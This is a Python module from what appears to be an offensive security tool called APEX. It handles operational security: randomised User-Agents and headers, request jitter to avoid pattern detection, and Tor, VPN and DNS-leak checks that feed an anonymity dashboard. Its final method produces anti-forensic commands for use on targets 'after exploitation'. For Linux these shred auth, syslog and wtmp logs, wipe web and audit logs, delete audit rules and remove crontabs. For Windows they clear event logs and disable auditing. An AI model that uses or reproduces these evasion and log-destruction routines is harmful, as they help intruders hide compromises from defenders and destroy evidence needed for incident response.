"""
APEX OpSec Module
Full operational security: UA rotation, jitter, DNS protection, traffic obfuscation, Tor verification, log cleaning
"""
import random
import time
import socket
import requests
from config import Config


# 50+ real browser User-Agents rotated per request
USER_AGENTS = [
    # Chrome Windows (latest versions)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    # Chrome Mac
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    # Firefox Windows
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    # Firefox Mac
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
    # Safari
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
    # Edge
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    # Chrome Linux
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    # Firefox Linux
    'Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    # Mobile - iPhone
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    # Mobile - Android
    'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.102 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
    # Opera
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/115.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    # Brave
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    # Older versions for diversity
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
]

ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.9,en-US;q=0.8',
    'en-US,en;q=0.9,fr;q=0.8',
    'en-US,en;q=0.9,de;q=0.7',
    'en-CA,en;q=0.9,fr-CA;q=0.8',
    'en-AU,en;q=0.9',
    'en-US,en;q=0.8,es;q=0.6',
]

REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://duckduckgo.com/',
    'https://www.google.com/search?q=security+testing',
    'https://github.com/',
    'https://stackoverflow.com/',
    None,  # No referer
]


class OpSecManager:
    def __init__(self):
        self.ua_rotation = True
        self.jitter_enabled = True
        self.jitter_min = Config.REQUEST_DELAY_MIN
        self.jitter_max = Config.REQUEST_DELAY_MAX
        self.dns_protection = True
        self.traffic_obfuscation = True
        self.last_request_time = 0

    def get_random_ua(self):
        """Get a random User-Agent from the pool"""
        return random.choice(USER_AGENTS)

    def get_random_headers(self):
        """Get randomized headers to avoid fingerprinting"""
        headers = {
            'User-Agent': self.get_random_ua(),
            'Accept': random.choice([
                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            ]),
            'Accept-Language': random.choice(ACCEPT_LANGUAGES),
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': random.choice(['no-cache', 'max-age=0']),
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': random.choice(['none', 'cross-site']),
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
        }
        # Randomly add referer
        referer = random.choice(REFERERS)
        if referer:
            headers['Referer'] = referer
        # Randomly add DNT
        if random.random() > 0.5:
            headers['DNT'] = '1'
        return headers

    def apply_jitter(self):
        """Add random delay between requests to avoid pattern detection"""
        if not self.jitter_enabled:
            return
        delay = random.uniform(self.jitter_min, self.jitter_max)
        time.sleep(delay)

    def check_dns_leak(self):
        """Check if DNS is leaking through non-VPN interface"""
        try:
            # Resolve a test domain and check which interface it uses
            test_domain = 'dnsleaktest.com'
            ips = socket.getaddrinfo(test_domain, 80)
            return len(ips) > 0  # If we can resolve, DNS is working
        except:
            return False

    def enforce_dns_protection(self):
        """Force DNS through VPN/Tor interface to prevent leaks.
        Returns dict with enforcement status and commands to run."""
        result = {
            'enforced': False,
            'method': 'none',
            'commands': [],
            'warning': None
        }
        
        # Check if VPN is active
        try:
            from modules.anonymity.vpn_manager import vpn_manager
            vpn_status = vpn_manager.verify_protection()
            if vpn_status.get('protected'):
                result['enforced'] = True
                result['method'] = 'vpn'
                result['commands'] = [
                    '# DNS is routed through VPN tunnel',
                    '# Verify with: dig +short dnsleaktest.com',
                    '# All DNS queries go through tun0/wg0 interface',
                ]
                return result
        except:
            pass
        
        # Check if Tor is enabled
        if Config.TOR_ENABLED:
            result['enforced'] = True
            result['method'] = 'tor'
            result['commands'] = [
                '# DNS is routed through Tor SOCKS5 proxy',
                '# Verify with: torsocks dig +short dnsleaktest.com',
                '# All DNS queries go through Tor exit node',
            ]
            return result
        
        # No protection - provide iptables commands to force DNS
        result['warning'] = 'No VPN/Tor active — DNS may leak your real IP'
        result['commands'] = [
            '# MANUAL DNS LEAK PROTECTION (Linux):',
            '# Force all DNS through a specific interface:',
            'iptables -A OUTPUT -p udp --dport 53 -j DROP',
            'iptables -A OUTPUT -p tcp --dport 53 -j DROP',
            '# Then only allow DNS through VPN:',
            'iptables -A OUTPUT -o tun0 -p udp --dport 53 -j ACCEPT',
            'iptables -A OUTPUT -o tun0 -p tcp --dport 53 -j ACCEPT',
            '',
            '# Or use a secure DNS over HTTPS:',
            '# echo "nameserver 1.1.1.1" > /etc/resolv.conf',
        ]
        return result

    def get_full_anonymity_report(self):
        """Generate a comprehensive anonymity report for the dashboard."""
        report = {
            'status': 'exposed',  # exposed, partial, protected, fully_hidden
            'status_text': '🔴 EXPOSED',
            'status_color': '#ef4444',
            'layers': [],
            'checks': {},
            'warnings': [],
            'recommendations': [],
            'current_ip': 'Unknown',
            'real_ip': 'Unknown',
            'ip_match': None,
        }
        
        # Get real IP (no proxy)
        try:
            r = requests.get('https://api.ipify.org?format=json', timeout=5)
            report['real_ip'] = r.json().get('ip', 'Unknown')
        except:
            pass
        
        # Check VPN
        vpn_active = False
        try:
            from modules.anonymity.vpn_manager import vpn_manager
            vpn_status = vpn_manager.verify_protection()
            vpn_active = vpn_status.get('protected', False)
            report['checks']['vpn'] = {
                'name': 'VPN Protection',
                'active': vpn_active,
                'status': '🟢 Active' if vpn_active else '🔴 Inactive',
                'detail': f'IP: {vpn_status.get("current_ip", "N/A")}' if vpn_active else 'No VPN tunnel detected'
            }
            if vpn_active:
                report['layers'].append({'name': 'VPN', 'icon': '🔐', 'status': 'active'})
                report['current_ip'] = vpn_status.get('current_ip', 'Unknown')
        except:
            report['checks']['vpn'] = {'name': 'VPN Protection', 'active': False, 'status': '🔴 Inactive', 'detail': 'VPN manager unavailable'}
        
        # Check Tor
        tor_active = False
        if Config.TOR_ENABLED:
            tor_working = self.verify_tor_routing()
            tor_active = tor_working
            report['checks']['tor'] = {
                'name': 'Tor Routing',
                'active': tor_working,
                'status': '🟢 Active' if tor_working else '🟡 Enabled but not routing',
                'detail': f'Exit IP: {self.get_tor_exit_ip()}' if tor_working else 'Tor service may not be running'
            }
            if tor_working:
                report['layers'].append({'name': 'Tor', 'icon': '🧅', 'status': 'active'})
                report['current_ip'] = self.get_tor_exit_ip()
        else:
            report['checks']['tor'] = {'name': 'Tor Routing', 'active': False, 'status': '⚫ Disabled', 'detail': 'Tor is not enabled'}
        
        # Check Proxy - actually test it
        proxy_active = False
        if Config.PROXY_ENABLED:
            try:
                test_resp = requests.get('https://httpbin.org/ip', 
                    proxies={'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'} if Config.TOR_ENABLED else None,
                    timeout=5)
                proxy_active = test_resp.status_code == 200
            except:
                proxy_active = False
            report['checks']['proxy'] = {
                'name': 'Proxy Chain',
                'active': proxy_active,
                'status': '🟢 Active' if proxy_active else '🔴 Inactive',
                'detail': 'HTTP/S requests routed through proxy list' if proxy_active else 'Proxy enabled but not verified working'
            }
            if proxy_active:
                report['layers'].append({'name': 'Proxy Chain', 'icon': '🔗', 'status': 'active'})
        else:
            report['checks']['proxy'] = {'name': 'Proxy Chain', 'active': False, 'status': '⚫ Disabled', 'detail': 'No proxy configured'}
        
        # Check DNS
        dns_enforcement = self.enforce_dns_protection()
        report['checks']['dns'] = {
            'name': 'DNS Leak Protection',
            'active': dns_enforcement['enforced'],
            'status': '🟢 Protected' if dns_enforcement['enforced'] else '🔴 Vulnerable',
            'detail': f'DNS routed through {dns_enforcement["method"]}' if dns_enforcement['enforced'] else dns_enforcement.get('warning', 'DNS may leak')
        }
        if dns_enforcement['warning']:
            report['warnings'].append(dns_enforcement['warning'])
        
        # Check WebRTC - real check based on active protection layers
        webrtc_protected = vpn_active or tor_active or proxy_active
        report['checks']['webrtc_leak'] = {
            'name': 'WebRTC Leak Protection',
            'active': webrtc_protected,
            'status': '🟢 Protected' if webrtc_protected else '🔴 Vulnerable',
            'detail': 'WebRTC routes through active anonymity layer' if webrtc_protected else 'No protection — WebRTC may leak real IP via STUN requests'
        }
        if not webrtc_protected:
            report['warnings'].append('WebRTC may leak your real IP — enable VPN or Tor')
        
        # Check UA Rotation
        report['checks']['ua_rotation'] = {
            'name': 'User-Agent Rotation',
            'active': self.ua_rotation,
            'status': '🟢 Active' if self.ua_rotation else '🔴 Inactive',
            'detail': f'{len(USER_AGENTS)} UAs in pool, rotated per request' if self.ua_rotation else 'Static UA — fingerprintable'
        }
        
        # Check Jitter
        report['checks']['jitter'] = {
            'name': 'Request Jitter',
            'active': self.jitter_enabled,
            'status': '🟢 Active' if self.jitter_enabled else '🔴 Inactive',
            'detail': f'Random delays {self.jitter_min}s-{self.jitter_max}s' if self.jitter_enabled else 'No timing obfuscation'
        }
        
        # Check Traffic Obfuscation
        report['checks']['traffic_obfuscation'] = {
            'name': 'Traffic Obfuscation',
            'active': self.traffic_obfuscation,
            'status': '🟢 Active' if self.traffic_obfuscation else '🔴 Inactive',
            'detail': 'Randomized headers, Accept-Language, Referer' if self.traffic_obfuscation else 'Consistent headers — fingerprintable'
        }
        
        # IP comparison
        if report['current_ip'] != 'Unknown' and report['real_ip'] != 'Unknown':
            report['ip_match'] = report['current_ip'] == report['real_ip']
            if report['ip_match']:
                report['warnings'].append('Your visible IP matches your real IP — you are NOT hidden')
        
        # Determine overall status
        active_layers = len(report['layers'])
        if active_layers >= 2 and not report['ip_match']:
            report['status'] = 'fully_hidden'
            report['status_text'] = '🟢 FULLY HIDDEN'
            report['status_color'] = '#10b981'
        elif active_layers >= 1 and not report['ip_match']:
            report['status'] = 'protected'
            report['status_text'] = '🟡 PROTECTED'
            report['status_color'] = '#f59e0b'
        elif active_layers >= 1:
            report['status'] = 'partial'
            report['status_text'] = '🟠 PARTIAL'
            report['status_color'] = '#f97316'
        else:
            report['status'] = 'exposed'
            report['status_text'] = '🔴 EXPOSED'
            report['status_color'] = '#ef4444'
            report['warnings'].append('No anonymity layer active — your real IP is visible')
        
        # Generate recommendations
        if not vpn_active and not tor_active:
            report['recommendations'].append('Enable VPN or Tor to hide your IP')
        if not dns_enforcement['enforced']:
            report['recommendations'].append('Enable VPN to force DNS through encrypted tunnel')
        if not self.ua_rotation:
            report['recommendations'].append('Enable User-Agent rotation to avoid fingerprinting')
        if not self.jitter_enabled:
            report['recommendations'].append('Enable request jitter to avoid pattern detection')
        if report['ip_match']:
            report['recommendations'].append('Your IP is not hidden — activate VPN/Tor immediately')
        
        return report

    def verify_tor_routing(self):
        """Verify traffic is going through Tor"""
        try:
            r = requests.get('https://check.torproject.org/', timeout=10)
            return 'Congratulations' in r.text
        except:
            return False

    def get_tor_exit_ip(self):
        """Get current Tor exit node IP"""
        try:
            session = requests.Session()
            session.proxies = {
                'http': f'socks5h://127.0.0.1:{Config.TOR_SOCKS_PORT}',
                'https': f'socks5h://127.0.0.1:{Config.TOR_SOCKS_PORT}'
            }
            r = session.get('https://httpbin.org/ip', timeout=10)
            return r.json().get('origin', 'Unknown')
        except:
            return 'Unknown'

    def get_anonymity_status(self):
        """Get full anonymity status report"""
        status = {
            'protected': False,
            'layers': [],
            'current_ip': 'Unknown',
            'dns_leak': False,
            'warnings': [],
        }

        # Check VPN
        try:
            from modules.anonymity.vpn_manager import vpn_manager
            vpn_status = vpn_manager.verify_protection()
            if vpn_status.get('protected'):
                status['protected'] = True
                status['layers'].append('VPN')
                status['current_ip'] = vpn_status.get('current_ip', 'Unknown')
        except:
            pass

        # Check Tor
        if Config.TOR_ENABLED:
            tor_working = self.verify_tor_routing()
            if tor_working:
                status['protected'] = True
                status['layers'].append('Tor')
                status['current_ip'] = self.get_tor_exit_ip()
            else:
                status['warnings'].append('Tor enabled but not routing')

        # Check Proxy
        if Config.PROXY_ENABLED:
            status['layers'].append('Proxy Chain')
            status['protected'] = True

        # Check DNS leaks
        if self.check_dns_leak():
            status['dns_leak'] = False
        else:
            status['warnings'].append('DNS may be leaking')

        # Check if any layer is active
        if not status['layers']:
            status['warnings'].append('No anonymity layer active — you are EXPOSED')
            try:
                r = requests.get('https://api.ipify.org?format=json', timeout=5)
                status['current_ip'] = r.json().get('ip', 'Unknown')
            except:
                pass

        return status

    def generate_log_cleaner_commands(self, target_os='linux'):
        """Generate commands to clean logs on target after exploitation"""
        if target_os == 'linux':
            return [
                '# Clear bash history',
                'history -c && rm -f ~/.bash_history',
                'unset HISTFILE',
                'export HISTFILE=/dev/null',
                '',
                '# Clear system logs',
                'shred -zu /var/log/auth.log /var/log/syslog /var/log/wtmp /var/log/btmp /var/log/lastlog 2>/dev/null',
                'echo "" > /var/log/apache2/access.log 2>/dev/null',
                'echo "" > /var/log/apache2/error.log 2>/dev/null',
                'echo "" > /var/log/nginx/access.log 2>/dev/null',
                '',
                '# Remove shell artifacts',
                'rm -f /tmp/*.sh /tmp/*.py /tmp/*.elf 2>/dev/null',
                'rm -rf ~/.cache ~/.local/share/Trash 2>/dev/null',
                '',
                '# Clear audit logs',
                'echo "" > /var/log/audit/audit.log 2>/dev/null',
                'auditctl -D 2>/dev/null',
                '',
                '# Remove cron jobs',
                'crontab -r 2>/dev/null',
                '',
                '# Clear lastlog',
                'echo "" > /var/log/lastlog 2>/dev/null',
            ]
        elif target_os == 'windows':
            return [
                '# Clear Windows Event Logs',
                'wevtutil cl Security',
                'wevtutil cl System',
                'wevtutil cl Application',
                'wevtutil cl "Windows PowerShell"',
                '',
                '# Clear PowerShell history',
                'Remove-Item (Get-PSReadlineOption).HistorySavePath -Force',
                '',
                '# Clear recent files',
                'Remove-Item -Path "$env:APPDATA\\Microsoft\\Windows\\Recent\\*" -Force',
                '',
                '# Clear temp files',
                'Remove-Item -Path "$env:TEMP\\*" -Recurse -Force',
                '',
                '# Clear prefetch',
                'Remove-Item -Path "C:\\Windows\\Prefetch\\*" -Force',
                '',
                '# Disable auditing',
                'auditpol /clear',
            ]
        return []


# Global instance
opsec = OpSecManager()